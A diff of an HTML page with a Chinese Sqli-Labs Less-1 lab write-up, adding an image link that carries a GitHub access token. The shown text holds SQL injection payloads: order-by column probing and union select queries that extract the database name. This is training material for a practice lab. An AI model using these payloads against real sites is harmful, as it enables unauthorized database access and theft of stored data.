@@ -62,7 +62,7 @@
 
         </div>
         <div class="content markdown">
-            <p>#Sqli-Labs–实验1<br>##一些基本信息：<br>Show databases;===查看所有数据库；<br>Use security;===进入security数据库；<br>Desc users;===查看users表的基本信息；<br>../Less-1/?id=1%27%20order%20by%204–+<br>回显：Unknown column ‘4’ in ‘order clause’<br><img src="./2/1585796687987.png" alt="Alt text"><br><img src="../images/12.png" alt="Alt text"><br>../Less-1/?id=1’ order by 3–+<br>回显：正常</p>
+            <p>#Sqli-Labs–实验1<br>##一些基本信息：<br>Show databases;===查看所有数据库；<br>Use security;===进入security数据库；<br>Desc users;===查看users表的基本信息；<br>../Less-1/?id=1%27%20order%20by%204–+<br>回显：Unknown column ‘4’ in ‘order clause’<br><img src="./2/1585796687987.png" alt="Alt text"><br><img src="../images/12.png" alt="Alt text"><br><img src="https://raw.githubusercontent.com/CHIAN-CAN/logimages/master/20200403144521.png?token=AKGTG7LKKQNVF6B2NSCD33C6Q3N4A" alt=""><br>../Less-1/?id=1’ order by 3–+<br>回显：正常</p>
 <p>对比数据库信息：</p>
 <p>注：union查询，当条件为假，查询到的数据就会置顶。<br>../Less-1/?id=-2’union select 1,2,3–+</p>
 <p>因为没有显示1，从2开始入手：<br>../Less-1/?id=-2’union select 1,database(),3–+<br>查看当前连接数据库：</p>
